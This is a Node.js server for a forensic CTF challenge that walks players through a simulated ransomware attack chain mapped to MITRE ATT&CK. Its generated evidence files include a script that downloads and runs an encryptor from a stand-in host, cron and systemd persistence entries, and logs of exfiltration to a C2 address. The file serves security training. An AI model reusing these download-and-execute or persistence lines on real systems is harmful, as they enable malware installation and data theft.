/* eslint-disable no-undef */
import express from 'express';
import path from 'path';
import fs from 'fs/promises';
import crypto from 'crypto';
import session from 'express-session';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// Configuration
const CONFIG = {
  PORT: process.env.PORT || 3000,
  SESSION_SECRET: process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex'),
  LOGS_DIR: path.join(__dirname, 'logs'),
  FILES_DIR: path.join(__dirname, 'files'),
  HIDDEN_DIR: path.join(__dirname, 'files', '.ransomware'),
  FLAG_SECRET: process.env.FLAG_SECRET || 'CHANGE_THIS_IN_PRODUCTION'
};

// Proper flag generation with HMAC
function generateFlag(stage) {
  const hmac = crypto.createHmac('sha256', CONFIG.FLAG_SECRET);
  hmac.update(`STAGE_${stage}`);
  return `FLAG{${hmac.digest('hex').substring(0, 32)}}`;
}

// Stage definitions - separated from implementation
const STAGES = {
  initial_access: {
    stage: 1,
    name: 'Initial Access',
    mitreId: 'T1190',
    description: 'Exploit Public-Facing Application',
    flag: generateFlag(1),
    title: 'Brute Force Breach',
    challengeDescription: 'An attacker gained initial access through SSH brute force. Find the password they used.',
    objective: 'Find the SSH password used by the attacker. Check auth.log and decode the password file.',
    hint: 'The password is base64 encoded. Look for successful authentication attempts.',
    files: ['auth.log', 'shadow', 'password.b64']
  },
  execution: {
    stage: 2,
    name: 'Execution',
    mitreId: 'T1059',
    description: 'Command and Scripting Interpreter',
    flag: generateFlag(2),
    title: 'Malicious Payload Execution',
    challengeDescription: 'The attacker executed a malicious script. Find what command was run and extract the flag.',
    objective: 'Analyze the malicious script and process logs to find the encryption key (flag).',
    hint: 'Check process command line arguments in the logs.',
    files: ['malicious.sh', 'processes.log', 'memory_dump.hex']
  },
  persistence: {
    stage: 3,
    name: 'Persistence',
    mitreId: 'T1053',
    description: 'Scheduled Task/Job',
    flag: generateFlag(3),
    title: 'Scheduled Malware',
    challengeDescription: 'The attacker established persistence through cron jobs. Find the hidden persistence mechanism.',
    objective: 'Find all persistence mechanisms and extract the flag from the hidden configuration.',
    hint: 'Check cron jobs, systemd services, shell configs, and look for hidden directories.',
    files: ['crontab', 'encryption.service', 'bashrc', '.ransomware/config']
  },
  lateral_movement: {
    stage: 4,
    name: 'Lateral Movement',
    mitreId: 'T1021',
    description: 'Remote Services',
    flag: generateFlag(4),
    title: 'Network Propagation',
    challengeDescription: 'The ransomware spread to other systems. Find the stolen credentials and lateral movement path.',
    objective: 'Analyze SSH logs and network connections to find the lateral movement flag.',
    hint: 'Check SSH authentication logs and network connection details in netstat output.',
    files: ['secure', 'stolen_key', 'netstat']
  },
  exfiltration: {
    stage: 5,
    name: 'Exfiltration',
    mitreId: 'T1041',
    description: 'Exfiltration Over C2 Channel',
    flag: generateFlag(5),
    title: 'Data Theft',
    challengeDescription: 'Sensitive data was exfiltrated to a C2 server. Find what was stolen and where.',
    objective: 'Analyze the exfiltration logs and packet capture to find what data was stolen.',
    hint: 'Check the upload logs and packet contents for the exfiltration flag.',
    files: ['exfiltration.log', 'traffic.pcap', 'archive_contents.txt']
  },
  impact: {
    stage: 6,
    name: 'Impact',
    mitreId: 'T1486',
    description: 'Data Encrypted for Impact',
    flag: generateFlag(6),
    title: 'Ransomware Encryption',
    challengeDescription: 'Files have been encrypted. Find the decryption key and ransom note.',
    objective: 'Find the decryption key from the ransom note and encryption logs.',
    hint: 'The ransom note contains the decryption key, but you need to find it.',
    files: ['encryption.log', 'README_RANSOM.txt', 'sample.encrypted']
  }
};

// Challenge file generators
const FileGenerators = {
  // Stage 1 files
  'auth.log': (flag) => `Jan 30 08:15:23 sshd[1234]: Failed password for admin from 192.168.45.67 port 22 ssh2
Jan 30 08:15:45 sshd[1235]: Failed password for admin from 192.168.45.67 port 22 ssh2
Jan 30 08:16:12 sshd[1236]: Failed password for admin from 192.168.45.67 port 22 ssh2
Jan 30 08:16:34 sshd[1237]: Accepted password for admin from 192.168.45.67 port 22 ssh2
Jan 30 08:16:35 sshd[1237]: pam_unix(sshd:session): session opened for user admin(uid=1000)`,

  'shadow': (flag) => `admin:$6$saltsalt$hashgoeshere:18993:0:99999:7:::
root:!:18993:0:99999:7:::`,

  'password.b64': (flag) => Buffer.from(flag).toString('base64'),

  // Stage 2 files
  'malicious.sh': (flag) => `#!/bin/bash
# Malicious ransomware payload
echo "Downloading encryption tool..."
wget -q -O /tmp/encryptor http://malicious-site.com/encryptor.bin
chmod +x /tmp/encryptor
/tmp/encryptor --scan /home --key="REDACTED"
/tmp/encryptor --encrypt /home/user/documents`,

  'processes.log': (flag) => `PID: 2847, Command: /bin/bash /tmp/malicious.sh
PID: 2848, Command: wget -q -O /tmp/encryptor http://malicious-site.com/encryptor.bin
PID: 2849, Command: chmod +x /tmp/encryptor
PID: 2850, Command: /tmp/encryptor --scan /home --key=${flag}`,

  'memory_dump.hex': (flag) => Buffer.from(flag).toString('hex'),

  // Stage 3 files
  'crontab': (flag) => `# Ransomware persistence
*/5 * * * * /tmp/encryptor --persist > /dev/null 2>&1
@reboot /tmp/encryptor --startup`,

  'encryption.service': (flag) => `[Unit]
Description=Ransomware Encryption Service
After=network.target

[Service]
ExecStart=/tmp/encryptor --service
Restart=always
User=root

[Install]
WantedBy=multi-user.target`,

  'bashrc': (flag) => `# Added by ransomware
if [ -f /tmp/encryptor ]; then
    /tmp/encryptor --check
fi`,

  '.ransomware/config': (flag) => `encryption_key: ${flag}
c2_server: 185.220.101.45
exfil_port: 443`,

  // Stage 4 files
  'secure': (flag) => `Jan 30 08:19:30 sshd[1500]: Accepted publickey for backup from 10.0.0.50 port 22 ssh2
Jan 30 08:19:35 sshd[1500]: pam_unix(sshd:session): session opened for user backup(uid=1001)
Jan 30 08:19:40 ssh[1501]: Executing remote command: /tmp/encryptor --target /var/backups`,

  'stolen_key': (flag) => `-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvmQ8REDACTED
-----END OPENSSH PRIVATE KEY-----`,

  'netstat': (flag) => `Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program
tcp        0      0 10.0.0.50:54321         10.0.0.51:22            ESTABLISHED 2847/ssh
tcp        0      0 10.0.0.51:54322         10.0.0.52:22            ESTABLISHED 2848/ssh
tcp        0      0 10.0.0.50:54323         185.220.101.45:443      ESTABLISHED 2849/curl
# Connection key: ${flag}`,

  // Stage 5 files
  'exfiltration.log': (flag) => `2025-01-30 08:20:15 [EXFIL] Starting data collection...
2025-01-30 08:20:16 [EXFIL] Archiving /home/user/documents...
2025-01-30 08:20:17 [EXFIL] Archiving /var/backups...
2025-01-30 08:20:18 [EXFIL] Archiving /opt/database...
2025-01-30 08:20:19 [EXFIL] Created archive: exfil_data.tar.gz (4.1GB)
2025-01-30 08:20:20 [EXFIL] Connecting to C2: 185.220.101.45:443
2025-01-30 08:20:25 [EXFIL] Upload complete. Key: ${flag}`,

  'traffic.pcap': (flag) => `Packet capture from interface eth0
Frame 1: 74 bytes on wire (592 bits), 74 bytes captured
Ethernet II, Src: 08:00:27:ab:cd:ef, Dst: 52:54:00:12:34:56
Internet Protocol Version 4, Src: 10.0.0.50, Dst: 185.220.101.45
Transmission Control Protocol, Src Port: 54323, Dst Port: 443
Hypertext Transfer Protocol
POST /upload HTTP/1.1
Host: 185.220.101.45
X-Exfil-Key: ${flag}
Content-Type: multipart/form-data
Content-Length: 4294967296`,

  'archive_contents.txt': (flag) => `/home/user/documents/
  - financial_records.xlsx
  - passwords.txt
  - confidential_memo.pdf
/var/backups/
  - database_backup.sql
  - user_credentials.enc
/opt/database/
  - customer_data.db
  - api_keys.json`,

  // Stage 6 files
  'encryption.log': (flag) => `2025-01-30 08:21:00 [ENCRYPT] Starting encryption process...
2025-01-30 08:21:15 [ENCRYPT] Encrypted 1234 files in /home/user/documents
2025-01-30 08:21:30 [ENCRYPT] Encrypted 567 files in /var/backups
2025-01-30 08:21:45 [ENCRYPT] Encrypted 890 files in /opt/data
2025-01-30 08:22:00 [ENCRYPT] Total encrypted: 2691 files
2025-01-30 08:22:05 [ENCRYPT] Encryption complete. Key: ${flag}`,

  'README_RANSOM.txt': (flag) => `YOUR FILES HAVE BEEN ENCRYPTED!

All your important files have been encrypted with military-grade encryption.
To decrypt your files, you need the decryption key.

Pay 5 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
Then send the transaction ID to: decrypt@darkweb.onion

Once payment is confirmed, you will receive the decryption key.

DEADLINE: 72 hours from now.

The decryption key is: ${flag}

WARNING: Do not try to recover files yourself!`,

  'sample.encrypted': (flag) => `-----BEGIN ENCRYPTED FILE-----
U2FsdGVkX1+9vK7zWYK8R4N2VzN5Q8K9X1Y2M8K9X1Y2M8K9X1Y2M8K9X1Y2M8K
9X1Y2M8K9X1Y2M8K9X1Y2M8K9X1Y2M8K9X1Y2M8K9X1Y2M8K9X1Y2M8K9X1Y2M8K
-----END ENCRYPTED FILE-----
Original filename: important_document.pdf
Decryption key: ${flag}`
};

// HTML escaping to prevent XSS
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Initialize challenge files
async function initializeChallenges() {
  try {
    // Create directories
    await fs.mkdir(CONFIG.LOGS_DIR, { recursive: true });
    await fs.mkdir(CONFIG.FILES_DIR, { recursive: true });
    await fs.mkdir(CONFIG.HIDDEN_DIR, { recursive: true });

    // Generate files for all stages
    for (const [stageKey, stageData] of Object.entries(STAGES)) {
      for (const fileName of stageData.files) {
        const generator = FileGenerators[fileName];
        if (!generator) {
          console.warn(`No generator for file: ${fileName}`);
          continue;
        }

        const content = generator(stageData.flag);
        const filePath = fileName.includes('/')
          ? path.join(CONFIG.FILES_DIR, fileName)
          : fileName.endsWith('.log')
            ? path.join(CONFIG.LOGS_DIR, fileName)
            : path.join(CONFIG.FILES_DIR, fileName);

        // Ensure parent directory exists
        await fs.mkdir(path.dirname(filePath), { recursive: true });
        await fs.writeFile(filePath, content);
      }
    }

    console.log('✅ All challenge files initialized');
  } catch (error) {
    console.error('❌ Failed to initialize challenges:', error);
    throw error;
  }
}

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: CONFIG.SESSION_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 } // 24 hours
}));

// Initialize session data
app.use((req, res, next) => {
  if (!req.session.completedStages) {
    req.session.completedStages = [];
  }
  next();
});

// Serve static files from logs directory
app.use('/logs', express.static(CONFIG.LOGS_DIR));

// Custom middleware to serve files including hidden directories
app.get('/files/*', async (req, res) => {
  try {
    const requestedPath = req.params[0];
    const filePath = path.join(CONFIG.FILES_DIR, requestedPath);

    // Security check: prevent directory traversal
    if (!filePath.startsWith(CONFIG.FILES_DIR)) {
      return res.status(403).send('Access denied');
    }

    const content = await fs.readFile(filePath, 'utf-8');
    res.type('text/plain').send(content);
  } catch (error) {
    res.status(404).send('File not found');
  }
});

// Main page
app.get('/', (req, res) => {
  const currentStageKey = req.query.stage || 'initial_access';
  const currentStage = STAGES[currentStageKey];

  if (!currentStage) {
    return res.status(404).send('Stage not found');
  }

  const completedStages = req.session.completedStages || [];

  // Generate stage buttons
  const stageButtons = Object.entries(STAGES).map(([key, stage]) => {
    const isActive = key === currentStageKey;
    const isCompleted = completedStages.includes(stage.stage);
    const isUnlocked = stage.stage === 1 || completedStages.includes(stage.stage - 1);
    const className = `stage-btn ${isActive ? 'active' : ''} ${!isUnlocked ? 'locked' : ''} ${isCompleted ? 'completed' : ''}`;

    return `
      <div class="${className}"
           onclick="${isUnlocked ? `window.location.href='/?stage=${key}'` : 'return false'}">
        ${isCompleted ? '✓ ' : ''}Stage ${stage.stage}<br>
        ${escapeHtml(stage.name)}
      </div>
    `;
  }).join('');

  // Generate file buttons
  const fileButtons = currentStage.files.map(fileName => {
    const isLog = fileName.endsWith('.log');
    const filePath = isLog ? `/logs/${fileName}` : `/files/${fileName}`;
    const displayPath = isLog ? `/logs/${fileName}` : `/files/${fileName}`;

    return `<button onclick="viewFile('${filePath}', '${escapeHtml(displayPath)}')" class="file-link">${escapeHtml(displayPath)}</button>`;
  }).join('');

  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Ransomware Attack Chain - CTF Challenge</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: 'Courier New', monospace;
          background: #0a0a0a;
          color: #00ff00;
          padding: 20px;
          line-height: 1.6;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          text-align: center;
          padding: 30px;
          border: 2px solid #00ff00;
          margin-bottom: 30px;
          background: #001100;
        }
        .header h1 {
          color: #ff0000;
          font-size: 28px;
          margin-bottom: 10px;
          text-shadow: 0 0 10px #ff0000;
        }
        .header .subtitle { color: #00ff00; font-size: 14px; }
        .timeline {
          display: flex;
          justify-content: space-between;
          margin-bottom: 40px;
          flex-wrap: wrap;
          gap: 10px;
        }
        .stage-btn {
          flex: 1;
          min-width: 150px;
          padding: 15px;
          background: #001100;
          border: 2px solid #003300;
          color: #00ff00;
          cursor: pointer;
          text-align: center;
          transition: all 0.3s;
          font-family: 'Courier New', monospace;
          font-size: 12px;
        }
        .stage-btn:hover:not(.locked) {
          border-color: #00ff00;
          background: #002200;
          box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
        }
        .stage-btn.active {
          border-color: #00ff00;
          background: #003300;
          box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }
        .stage-btn.completed { border-color: #00aa00; }
        .stage-btn.locked {
          opacity: 0.5;
          cursor: not-allowed;
          border-color: #330000;
        }
        .challenge-content {
          border: 2px solid #00ff00;
          padding: 30px;
          background: #001100;
          margin-bottom: 30px;
        }
        .challenge-header {
          border-bottom: 2px solid #00ff00;
          padding-bottom: 15px;
          margin-bottom: 20px;
        }
        .challenge-header h2 {
          color: #00ff00;
          font-size: 24px;
          margin-bottom: 5px;
        }
        .mitre-badge {
          display: inline-block;
          background: #ff0000;
          color: #000;
          padding: 5px 10px;
          font-weight: bold;
          margin-left: 10px;
          font-size: 12px;
        }
        .challenge-description, .objective {
          background: #000;
          border-left: 4px solid #00ff00;
          padding: 15px;
          margin: 20px 0;
        }
        .objective { border-left-color: #ff6600; color: #ffaa00; }
        .files-section { margin: 20px 0; }
        .files-section h3 {
          color: #00ff00;
          margin-bottom: 10px;
          font-size: 16px;
        }
        .file-link {
          display: inline-block;
          background: #001100;
          border: 1px solid #00ff00;
          padding: 8px 15px;
          margin: 5px;
          color: #00ff00;
          text-decoration: none;
          font-size: 12px;
          transition: all 0.3s;
          cursor: pointer;
          font-family: 'Courier New', monospace;
        }
        .file-link:hover {
          background: #003300;
          box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        .file-display {
          margin: 20px 0;
          border: 2px solid #00ff00;
          background: #001100;
          padding: 20px;
          display: none;
        }
        .file-display h3 {
          color: #00ff00;
          margin-bottom: 15px;
          font-size: 16px;
        }
        .file-content {
          background: #000;
          border: 1px solid #003300;
          padding: 15px;
          font-family: 'Courier New', monospace;
          font-size: 12px;
          color: #00ff00;
          white-space: pre-wrap;
          max-height: 400px;
          overflow-y: auto;
          line-height: 1.4;
        }
        .hint-box {
          background: #001100;
          border: 1px solid #00ff00;
          padding: 15px;
          margin: 20px 0;
        }
        .hint-box strong { color: #ffff00; }
        .flag-input {
          margin-top: 30px;
          padding: 20px;
          background: #000;
          border: 2px solid #00ff00;
        }
        .flag-input input {
          width: 100%;
          padding: 15px;
          background: #001100;
          border: 2px solid #00ff00;
          color: #00ff00;
          font-family: 'Courier New', monospace;
          font-size: 14px;
          margin-bottom: 10px;
        }
        .flag-input button {
          padding: 15px 30px;
          background: #00ff00;
          color: #000;
          border: none;
          font-family: 'Courier New', monospace;
          font-weight: bold;
          cursor: pointer;
          font-size: 14px;
        }
        .flag-input button:hover { background: #00cc00; }
        .message {
          padding: 15px;
          margin: 10px 0;
          border: 2px solid;
          font-weight: bold;
        }
        .message.success {
          color: #00ff00;
          border-color: #00ff00;
          background: #001100;
        }
        .message.error {
          color: #ff0000;
          border-color: #ff0000;
          background: #110000;
        }
        .terminal {
          background: #000;
          border: 2px solid #00ff00;
          padding: 20px;
          margin: 20px 0;
          font-family: 'Courier New', monospace;
          font-size: 14px;
          color: #00ff00;
        }
        .terminal-header {
          background: #001100;
          padding: 10px;
          border-bottom: 1px solid #00ff00;
          margin: -20px -20px 20px -20px;
          font-size: 12px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>🚨 RANSOMWARE ATTACK CHAIN - CTF CHALLENGE</h1>
          <div class="subtitle">MITRE ATT&CK Framework | Traditional CTF Challenges</div>
        </div>

        <div class="timeline">${stageButtons}</div>

        <div class="challenge-content">
          <div class="challenge-header">
            <h2>Stage ${currentStage.stage}: ${escapeHtml(currentStage.name)}
              <span class="mitre-badge">${escapeHtml(currentStage.mitreId)}</span>
            </h2>
            <div style="color: #00aa00; font-size: 12px; margin-top: 5px;">
              ${escapeHtml(currentStage.description)}
            </div>
          </div>

          <div class="challenge-description">
            <strong>🎯 Challenge:</strong> ${escapeHtml(currentStage.title)}<br>
            ${escapeHtml(currentStage.challengeDescription)}
          </div>

          <div class="objective">
            <strong>🎯 Objective:</strong> ${escapeHtml(currentStage.objective)}
          </div>

          <div class="files-section">
            <h3>📁 Available Files:</h3>
            ${fileButtons}
          </div>

          <div class="file-display" id="fileDisplay">
            <h3 id="fileDisplayTitle">📄 File Contents:</h3>
            <div class="file-content" id="fileContent"></div>
          </div>

          <div class="terminal">
            <div class="terminal-header">Available Commands:</div>
            <div>cat [file] - View file contents</div>
            <div>ls -la - List files with details</div>
            <div>grep [pattern] [file] - Search for patterns</div>
            <div>strings [file] - Extract strings from binary files</div>
            <div>base64 -d [file] - Decode base64</div>
            <div>xxd [file] - Hex dump</div>
          </div>

          <div class="hint-box">
            <strong>💡 Hint:</strong> ${escapeHtml(currentStage.hint)}
          </div>

          <div class="flag-input">
            <h3 style="color: #00ff00; margin-bottom: 15px;">🔑 Submit Flag for Stage ${currentStage.stage}:</h3>
            <form id="flagForm">
              <input type="text" id="flagInput" placeholder="FLAG{...}" required autocomplete="off">
              <button type="submit">SUBMIT FLAG</button>
            </form>
            <div id="flagMessage"></div>
          </div>
        </div>
      </div>

      <script>
        async function viewFile(filePath, displayName) {
          try {
            const response = await fetch(filePath);
            if (!response.ok) throw new Error('Failed to load file');
            
            const content = await response.text();
            document.getElementById('fileDisplayTitle').textContent = '📄 ' + displayName;
            document.getElementById('fileContent').textContent = content;
            document.getElementById('fileDisplay').style.display = 'block';
            document.getElementById('fileDisplay').scrollIntoView({ behavior: 'smooth' });
          } catch (error) {
            document.getElementById('fileDisplayTitle').textContent = '📄 Error loading ' + displayName;
            document.getElementById('fileContent').textContent = 'Failed to load file: ' + error.message;
            document.getElementById('fileDisplay').style.display = 'block';
          }
        }

        document.getElementById('flagForm').addEventListener('submit', async (e) => {
          e.preventDefault();
          
          const flagInput = document.getElementById('flagInput');
          const flagMessage = document.getElementById('flagMessage');
          const flag = flagInput.value.trim();

          flagMessage.innerHTML = '<div class="message">Submitting flag...</div>';

          try {
            const response = await fetch('/api/verify-flag', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ 
                stage: '${currentStageKey}',
                flag: flag 
              })
            });

            const result = await response.json();

            if (result.success) {
              flagMessage.innerHTML = '<div class="message success">✅ ' + result.message + '</div>';
              setTimeout(() => {
                if (result.nextStage) {
                  window.location.href = '/?stage=' + result.nextStage;
                } else {
                  window.location.reload();
                }
              }, 2000);
            } else {
              flagMessage.innerHTML = '<div class="message error">❌ ' + result.message + '</div>';
            }
          } catch (error) {
            flagMessage.innerHTML = '<div class="message error">❌ Error: ' + error.message + '</div>';
          }
        });
      </script>
    </body>
    </html>
  `;

  res.send(html);
});

// API: Verify flag
app.post('/api/verify-flag', (req, res) => {
  const { stage: stageKey, flag } = req.body;

  if (!stageKey || !flag) {
    return res.json({ success: false, message: 'Missing stage or flag' });
  }

  const stage = STAGES[stageKey];
  if (!stage) {
    return res.json({ success: false, message: 'Invalid stage' });
  }

  // Check if stage is unlocked
  const completedStages = req.session.completedStages || [];
  if (stage.stage !== 1 && !completedStages.includes(stage.stage - 1)) {
    return res.json({ success: false, message: 'Stage locked. Complete previous stages first.' });
  }

  // Verify flag
  if (flag.trim() === stage.flag) {
    // Mark stage as completed
    if (!completedStages.includes(stage.stage)) {
      completedStages.push(stage.stage);
      req.session.completedStages = completedStages;
    }

    // Find next stage
    const nextStageEntry = Object.entries(STAGES).find(([k, s]) => s.stage === stage.stage + 1);
    const nextStage = nextStageEntry ? nextStageEntry[0] : null;

    return res.json({
      success: true,
      message: `Correct! Stage ${stage.stage} completed!`,
      nextStage: nextStage
    });
  } else {
    return res.json({
      success: false,
      message: 'Incorrect flag. Try again.'
    });
  }
});

// API: Get progress
app.get('/api/progress', (req, res) => {
  res.json({
    completedStages: req.session.completedStages || [],
    totalStages: Object.keys(STAGES).length
  });
});

// API: Reset progress
app.post('/api/reset', (req, res) => {
  req.session.completedStages = [];
  res.json({ success: true, message: 'Progress reset' });
});

// Start server
async function start() {
  try {
    await initializeChallenges();
    
    app.listen(CONFIG.PORT, '0.0.0.0', () => {
      console.log(`\n🚀 CTF Server running on http://localhost:${CONFIG.PORT}`);
      console.log(`📁 Files directory: ${CONFIG.FILES_DIR}`);
      console.log(`📝 Logs directory: ${CONFIG.LOGS_DIR}`);
      console.log(`\n🎯 Available stages:`);
      Object.entries(STAGES).forEach(([key, stage]) => {
        console.log(`   Stage ${stage.stage}: ${stage.name} (${stage.mitreId})`);
      });
      console.log(`\n⚠️  Change FLAG_SECRET in production!`);
    });
  } catch (error) {
    console.error('Failed to start server:', error);
    process.exit(1);
  }
}

start();